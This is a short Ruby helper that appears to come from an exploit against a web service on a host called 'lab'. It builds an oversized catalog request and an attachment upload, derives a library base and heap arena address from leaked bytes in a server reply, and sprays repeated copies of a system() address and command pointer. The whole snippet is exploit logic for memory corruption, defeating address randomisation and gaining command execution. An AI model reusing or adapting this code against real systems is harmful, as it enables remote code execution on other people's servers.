def construct(reply, system_addr, command_pointer)
  request = "GET /catalog/" + "+" * 640 + " HTTP/1.1\r\nHost: lab\r\n\r\n"
  upload = "POST /attachments HTTP/1.1\r\nContent-Length: 4097\r\n\r\n"
  library = reply[72, 8].unpack1('Q<') & ~0xfff
  arena = reply[96, 8].unpack1('Q<')
  tiled = [system_addr, command_pointer, 0].pack('Q<Q<Q<') * 96
  [request, upload, library, arena, tiled]
end
